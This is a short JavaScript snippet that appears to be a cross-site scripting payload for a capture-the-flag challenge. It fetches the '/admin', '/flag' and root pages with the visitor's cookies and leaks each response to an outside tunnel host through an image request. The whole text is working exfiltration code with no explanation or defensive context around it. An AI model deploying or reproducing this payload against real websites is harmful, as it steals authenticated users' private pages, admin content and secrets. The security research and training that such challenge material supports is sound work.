(function () {
  function exfil(path) {
    return fetch(path, { credentials: 'include' })
      .then(r => r.text())
      .then(t => {
        new Image().src =
          'https://a7f81727fd01c944-185-240-49-214.serveousercontent.com/?d=' +
          encodeURIComponent('PATH=' + path + '\n' + t);
      });
  }

  exfil('/admin').catch(() => {});
  exfil('/flag').catch(() => {});
  exfil('/').catch(() => {});
})();
